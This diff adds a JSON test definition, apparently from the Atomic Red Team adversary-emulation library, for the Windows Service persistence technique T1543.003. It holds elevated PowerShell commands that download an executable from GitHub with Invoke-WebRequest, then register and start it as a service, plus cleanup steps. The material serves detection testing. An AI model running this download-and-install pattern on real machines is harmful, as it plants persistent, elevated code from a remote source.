@@ -1,0 +1,44 @@
+{
+    "name": "Service Installation PowerShell",
+    "description": "Installs A Local Service via PowerShell. Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n",
+        "cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n",
+        "type": "Command Executor"
+    },
+    "id": "T1543.003",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Windows Service",
+    "source": "ART",
+    "uuid": "491a4af6-a521-4b74-b23b-f7b3f1ee9e77",
+    "arguments": {
+        "binary_path": {
+            "description": "Name of the service binary, include path.",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"
+        },
+        "service_name": {
+            "description": "Name of the Service",
+            "type": "string",
+            "default": "AtomicTestService_PowerShell"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Service binary must exist on disk at specified location (#{binary_path})\n",
+            "prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
